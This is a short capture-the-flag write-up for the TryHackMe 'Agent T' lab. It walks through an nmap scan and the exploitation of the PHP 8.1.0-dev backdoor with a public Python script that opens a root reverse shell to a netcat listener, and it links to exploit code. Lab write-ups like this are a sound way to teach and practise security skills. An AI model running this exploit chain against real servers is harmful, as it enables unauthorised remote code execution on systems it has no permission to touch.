---
title: "Agent T WriteUp"
categories: [ctf]
date: 2022/08/07
description: TryHackMe Agent T WriteUp.
---

# TryHackMe | Agent T

<p align="center">
  <img src="/img/agent_t_thm/img.png">
</p>

## Scanning && Enumeration

Let's start with the network scan first.



```bash
nmap -sSV --min-rate 1000 -p- -v <ip>

```
A web application is running on port 80. PHP 8.1.0 dev version. Let's look at the web interface.

<p align="center">
  <img src="/img/agent_t_thm/1.png">
</p>

This is the default admin dashboard. I browsed the pages, but i couldn't find any important clue or information.

It made more sense to find exploits suitable for PHP version.

## Exploitation

<p align="center">
  <img src="/img/agent_t_thm/2.png">
</p>

I found the appropriate exploit in exploit-db, but it didn't give me tty access, so i decided not to use the other exploit. Of course the choice is yours.

<p align="center">
  <img src="/img/agent_t_thm/3.png">
</p>

In order to exploit the remote code execution vulnerability, i listened with netcat and gave the necessary addresses and ports to the python script. I finally got the root shell.

```bash

python3 rce.py <dst-ip> <src-ip> <src-port>

```

<p align="center">
  <img src="/img/agent_t_thm/4.png">
</p>

There is no need for any privilege escalation process and we can find it with the find command since it asks for a flag from us.

<p align="center">
  <img src="/img/agent_t_thm/5.png">
</p>

```bash
find / -name *.txt

```

It was that simple. Yes, this is very easy when you do the right enumeration and exploitation.






### Resources

 - [Exploit 1](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py "Exploit")
 - [Exploit 2](https://www.exploit-db.com/exploits/49933 "Exploit 2")



